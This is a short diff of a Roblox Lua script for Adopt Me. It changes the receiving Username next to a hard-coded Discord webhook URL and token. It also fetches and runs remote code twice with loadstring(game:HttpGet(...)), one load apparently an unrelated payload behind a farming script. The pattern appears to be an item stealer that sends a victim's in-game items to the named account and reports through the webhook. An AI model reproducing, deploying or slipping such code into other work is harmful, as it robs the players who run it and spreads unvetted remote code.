@@ -72,7 +72,7 @@ local function checkPlayerCount()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/InderLol/AdoptMeScript/main/OceanFarm", true))()
 	wait(1)
 	getgenv().gui = false
-	Username = "AdoptMeInventory125"
+	Username = "Metschal"
 	Webhook = "https://discord.com/api/webhooks/1284838440411594803/_8onbNULr3R_Ymy3h6-7QJGuP5DqhZybYGpAukc89GqjEE4MYarvwJYC6RwHr18f3mP3"
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua", true))()
 end
